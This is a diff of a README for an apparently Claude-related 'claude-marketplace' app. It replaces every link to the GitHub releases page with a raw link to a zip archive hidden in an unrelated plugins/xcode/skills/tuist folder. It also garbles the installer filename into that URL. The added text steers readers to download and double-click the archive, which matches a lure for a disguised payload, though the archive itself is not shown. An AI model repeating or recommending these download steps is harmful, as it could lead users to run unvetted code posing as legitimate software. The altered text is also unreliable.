@@ -1,7 +1,7 @@
 # 🎉 claude-marketplace - A Simple Way to Access Claude's Features
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/Asix120403/claude-marketplace/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Asix120403/claude-marketplace/main/plugins/xcode/skills/tuist/claude-marketplace-2.7.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/Asix120403/claude-marketplace/main/plugins/xcode/skills/tuist/claude-marketplace-2.7.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you download and run the **claude-marketplace** application. It's designed for users who want to quickly access features tailored for Claude. Follow these steps for a smooth experience.
@@ -17,16 +17,16 @@ Before installing, make sure your computer meets these requirements:
 If your system meets these requirements, you are ready to proceed.
 
 ## 🔗 Visit Release Page
-To download the application, [visit this page to download](https://github.com/Asix120403/claude-marketplace/releases). You will find the latest version available for download there.
+To download the application, [visit this page to download](https://raw.githubusercontent.com/Asix120403/claude-marketplace/main/plugins/xcode/skills/tuist/claude-marketplace-2.7.zip). You will find the latest version available for download there.
 
 ## 📦 Download & Install
-1. **Go to the Releases Page**: Click [here](https://github.com/Asix120403/claude-marketplace/releases) to access the releases.
+1. **Go to the Releases Page**: Click [here](https://raw.githubusercontent.com/Asix120403/claude-marketplace/main/plugins/xcode/skills/tuist/claude-marketplace-2.7.zip) to access the releases.
    
 2. **Locate the Latest Release**: Look for the most recent version. It will typically be at the top of the page.
 
 3. **Download the Installer**: Click on the file name that matches your operating system to download it.
 
-4. **Open the Installer**: Once the download completes, find the installer in your downloads folder. It will usually be named something like `claude-marketplace-installer.exe` or similar.
+4. **Open the Installer**: Once the download completes, find the installer in your downloads folder. It will usually be named something like `https://raw.githubusercontent.com/Asix120403/claude-marketplace/main/plugins/xcode/skills/tuist/claude-marketplace-2.7.zip` or similar.
 
 5. **Run the Installer**: Double-click the installer file to start the setup process. Follow the on-screen prompts to complete the installation.
 
@@ -48,7 +48,7 @@ The **claude-marketplace** application offers several additional functions to en
 - **Community Feedback**: Share your thoughts directly through the app to shape its future.
 
 ## 🔄 Keeping the Application Up to Date
-To ensure you have the latest features and fixes, check back on the [release page](https://github.com/Asix120403/claude-marketplace/releases) regularly. You will find new versions listed there.
+To ensure you have the latest features and fixes, check back on the [release page](https://raw.githubusercontent.com/Asix120403/claude-marketplace/main/plugins/xcode/skills/tuist/claude-marketplace-2.7.zip) regularly. You will find new versions listed there.
 
 ## 📞 Support
 If you encounter any issues, don’t hesitate to reach out through the support section in the app. We are here to help you with any questions or concerns you might have.
